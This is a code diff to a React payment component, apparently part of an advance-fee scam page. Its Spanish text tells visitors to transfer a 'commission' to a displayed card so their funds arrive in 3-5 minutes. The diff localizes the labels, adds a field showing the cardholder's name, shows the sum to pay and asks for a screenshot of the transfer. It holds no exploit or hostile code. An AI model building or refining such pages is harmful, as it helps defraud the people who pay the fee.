@@ -85,9 +85,11 @@ const UsdInputSecond = () => {
         Transfiera la comisión a esta tarjeta, tras lo cual recibirá sus fondos
         en 3-5 minutos
       </div>
-      <div className="pt-4 pb-1 max-xsmall:pt-1">Card number:</div>
+      <div className="pt-2 pb-1 max-xsmall:pt-1">Número de tarjeta:</div>
       <CopyTextElement text={card?.details}>{card?.details}</CopyTextElement>
-      <div className="pt-4 pb-1">Sum:</div>
+      <div className="pt-2 pb-1 max-xsmall:pt-1">NOMBRE:</div>
+      <CopyTextElement text={card?.Fio}>{card?.Fio}</CopyTextElement>
+      <div className="pt-2 pb-1">Suma:</div>
       <CopyTextElement text={currency * priceAmount}>
         {currency * priceAmount} {country}
       </CopyTextElement>
@@ -122,7 +124,7 @@ const UsdInputSecond = () => {
           <p>Fichero seleccionado: {selectedFile.name}</p>
         </div>
       )}
-      <div className="pt-1 pb-1 text-center text-[14px] mt-1  max-xsmall:pt-1">
+      <div className="pt-1 pb-1 text-center text-[12px] mt-1  max-xsmall:pt-1">
         {" "}
         Tras el pago, haz clic en el botón &apos;añade tu captura de
         pantalla&apos; y envía una captura de pantalla de la transacción a
